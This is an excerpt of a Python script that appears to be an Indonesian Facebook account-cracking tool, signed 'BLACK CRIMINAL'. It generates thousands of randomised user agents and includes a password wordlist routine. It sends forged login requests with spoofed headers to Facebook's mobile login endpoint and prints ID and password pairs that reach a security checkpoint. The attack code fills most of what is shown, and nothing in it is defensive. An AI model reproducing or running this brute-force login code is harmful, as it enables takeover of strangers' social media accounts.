...
for xd in range(10000):
	...
	uaku=f'Mozilla/5.0 (Linux; Android 10; Redmi Note 7 {str(random.randrange)}QKQ1.190910.002; wv) AppleWebKit/537.36'
	ugen.append(uaku)
...
for t in range(10000):
	rr = random.randint
	rfn1=f'Mozilla/5.0 (Linux; Android 5.1.1; SM-J320FN Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+str(random.randrange(10,116))+'.0.'+str(random.randrange(10,4798))+'.'+str(random.randrange(10,499))+' Mobile Safari/537.36'
...
for tt in range(10000):
	...
	zx1=f"Mozilla/5.0 (Linux; Android 11; RMX3506 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'+str(random.randrange(10,116))+'.0.'+str(random.randrange(10,4798))+'.'+str(random.randrange(10,499))+' Mobile Safari/537.36"
...
ua = random.choice(["Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/12.3.2;FBSS/3;FBCR/AT&T;FBID/phone;FBLC/en_US;FBOP/5]","Mozilla/5.0 (iPad; CPU OS 14_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPad8,12;FBMD/iPad;FBSN/iOS;FBSV/14.0.1;FBSS/2;FBID/tablet;FBLC/en_US;FBOP/5]","Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/MessengerForiOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/12.4;FBSS/2;FBCR/Mobile TeleSystems;FBID/phone","Mozilla/5.0 (Linux; Android 7.0; VOX STEEL Plus Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36[FBAN/EMA;FBLC/ar_AR;FBAV/359.0.0.11.81;]","Mozilla/5.0 (Linux; Android 10; Aquaris X2 Pro Build/QKQ1.200216.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/363.0.0.6.63;]","Mozilla/5.0 (Linux; Android 12; itel A632W Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/369.0.0.5.110;]","Mozilla/5.0 (Windows NT 10.0.10586.713; osmeta 8.3.47029472) AppleWebKit/602.1.1 (KHTML, like Gecko) Version/9.0 Safari/602.1.1 osmeta/8.3.47029472 Build/47029472 [FBAN/FBW;FBAV/75.0.0.50.22;FBBV/47052341;FBRV/0;FBDV/WindowsDevice;FBMD/Aspire one 1-431;FBSN/Windows;FBSV/10.0.10586.753;FBSS/1;FBCR/;FBID/desktop;FBLC/en_GB;FBOP/45]"])
#------------[ INDICATION ]---------------#
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} Sedang Menunggu yang mau sama lu {m}•{k}•{h}•{x} <<<<< ')
...
'__user':0
			...
			headers = {'Host': 'm.facebook.com','content-length': '2284','sec-ch-ua': '"Chromium";v="108", "Not A(Brand";v="8", "Google Chrome";v="108"','sec-ch-ua-mobile': '?0','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVoLmzMqMHw','x-asbd-id': '129477','save-data': 'on','sec-ch-ua-platform': 'Windows"','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124207444332529&kid_directed_site=0&app_id=124207444332529&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D124207444332529%26redirect_uri%3Dhttps%253A%252F%252Fpassport.alibaba.com%252Foauth_sign.htm%253Ftype%253Dfacebook%26display%3Dpopup%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%252Cuser_work_history%26state%3Didc_7a0vEG1Jtod40M7GtqKkw5Q%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D04e6cf52-1ede-42b7-8759-38af448b6f4b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Didc_7a0vEG1Jtod40M7GtqKkw5Q%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=124207444332529&auth_token=1406ec206029432fd30b128843af461a&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fclient_id%3D124207444332529%26redirect_uri%3Dhttps%253A%252F%252Fpassport.alibaba.com%252Foauth_sign.htm%253Ftype%253Dfacebook%2526return_url%253Dhttps%25253A%25252F%25252Flogin.alibaba.com%25252Fauto_login.htm%26display%3Dpopup%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%252Cuser_work_history%26state%3Didc_70W4ujBsKA4vKWiswinTGGw%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D69e37d8b-1832-446f-94ce-acd3aa36bc09%26tp%3Dunspecified&refsrc=deprecated&app_id=124207444332529&cancel=https%3A%2F%2Fpassport.alibaba.com%2Foauth_sign.htm%3Ftype%3Dfacebook%26return_url%3Dhttps%253A%252F%252Flogin.alibaba.com%252Fauto_login.htm%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Didc_70W4ujBsKA4vKWiswinTGGw%23_%3D_&lwv=101',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r*--> {K}{idf}|{pw}{N}>> {cektahun(idf)}{x}\n{ua}{N}')
...
if __name__=='__main__':
	...
	alvino_xy(f'\n\t{x}——> {h}Gunakan script dengan bijak ya kntl | AUTHOR : Ripal XD | BLACK CRIMINAL \n\t{x}')
	time.sleep(3)
	login()
